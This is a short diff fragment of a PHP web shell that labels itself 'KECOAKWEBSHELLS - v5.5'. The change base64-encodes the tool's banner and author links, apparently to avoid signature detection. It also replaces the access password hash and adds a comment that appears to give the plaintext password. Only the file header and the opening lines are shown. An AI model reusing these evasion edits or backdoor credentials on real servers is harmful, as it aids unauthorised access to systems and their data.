@@ -1,12 +1,12 @@
 <?php
 /**
- * KECOAKWEBSHELLS - v5.5
- * umbra.st/L4663r666h05t
- * x.com/L4663r666h05t
+ * S0VDT0FLV0VCU0hFTExTIC0gdjUuNQ==
+ * dW1icmEuc3QvTDQ2NjNyNjY2aDA1dA==
+ * eC5jb20vTDQ2NjNyNjY2aDA1dA==
  */
 session_start();
 
-$p_hash = 'e773536932c61c7ee11944cefde49e30';
+$p_hash = '7fd65a15ac93f2fdfc70e174074c8855'; // dokterbug
 $f_name = basename(__FILE__);
 
 function x_d($s) {
